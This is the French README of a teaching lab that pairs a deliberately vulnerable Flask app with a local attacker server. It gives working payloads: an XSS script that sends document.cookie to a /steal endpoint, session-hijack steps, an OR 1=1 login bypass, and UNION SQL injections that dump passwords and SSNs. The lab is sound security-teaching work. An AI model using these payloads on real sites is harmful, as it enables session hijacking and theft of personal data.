# XSS-SQLi Project

# 🛡️ Laboratoire XSS & SQL Injection

Ce projet démontre les attaques XSS/SQLi et leurs contre-mesures à travers 3 composants :

1. `#vulnerable_app` - Application Flask vulnérable
2. `#attaquant_server` - Serveur de démonstration d'attaques
3. `#secure_app` - Version sécurisée (en développement)

## 🚀 Configuration rapide

### Prérequis
- Python 3.11+
- Git
- Ports 5000 et 5001 disponibles

### Installation
```bash
# 1. Cloner le dépôt
git clone https://github.com/whersmyelephant/XSS-SQLi.git
cd XSS-SQLi

# 2. Configurer l'application vulnérable
cd #vulnerable_app
python -m venv venv
source venv/bin/activate  # Linux/Mac
venv\Scripts\activate    # Windows
pip install -r requirements.txt

# 3. Configurer le serveur d'attaque
cd ../#attaquant_server
python -m venv venv
source venv/bin/activate  # Linux/Mac
venv\Scripts\activate    # Windows
pip install -r requirements.txt

# Dans un terminal : Application vulnérable
cd #vulnerable_app/app
python app.py  # http://localhost:5000

# Dans un autre terminal : Serveur d'attaque
cd #attaquant_server
python app.py  # http://localhost:5001

🎯 Scénarios de démonstration

I/Vol de session

    Visitez http://localhost:5001/session_hijacker

    Copiez le script fourni

    Collez-le dans un champ de l'application vulnérable

    Les cookies apparaîtront dans http://localhost:5001/dashboard

    XSS 

dans http://localhost:5000/search
<script>alert('TestXSS')</script>

<script>
fetch('http://localhost:5001/steal?c=' + document.cookie, { mode: 'no-cors' })
</script>

Puis dans un onglet de nav privé 
document.cookie = "session=VOTRE_COOKIE_VOLE; path=/";
location.reload();

essayer d'accéder à la page http://localhost:5000/admin pour valider le vol de ession

se déconnecter : 
fetch('/logout').then(() => location.reload())

visualiser le résultat dans le terminal attaquant ou dans http://localhost:5001/dashboard
[!] COOKIE VOLÉ (2025-06-29 21:04:21):
127.0.0.1 - - [29/Jun/2025 21:04:21] "GET /steal?c= HTTP/1.1" 404 -

Now, on https://localhost:5000
f12 > stockage > cookies
refresh
Now, 
https://localhost:5000/admin

II/Cross-Site Scripting (XSS)

    Connectez-vous à http://localhost:5000 (user: test, password: test)

    Dans le champ de recherche, entrez :
    <script>alert('XSS Réussi!')</script>

    Observez l'alerte s'exécuter dans le navigateur

III/SQL Injection

    ' OR 1=1 --
   
    Comme mot de passe : n'importe quoi
    Vous serez connecté comme premier utilisateur

    Déterminer le nombre de colonnes 
' ORDER BY 10-- #essayer de 1 jusqu'à x tant que cela ne retourne pas de résultat

identify version SQL
' UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9,10-- #selon le nombre de colonnes retournées précédemment

list tables 
' UNION SELECT 1,group_concat(tbl_name),3,4,5,6,7,8,9,10 FROM sqlite_master-- #selon le nombre de colonnes retournées précédemment

Données sensibles 
' UNION SELECT id,username,password,role,full_name,email,phone,birthdate,ssn FROM user-- #selon les colonnes retournées précédemment

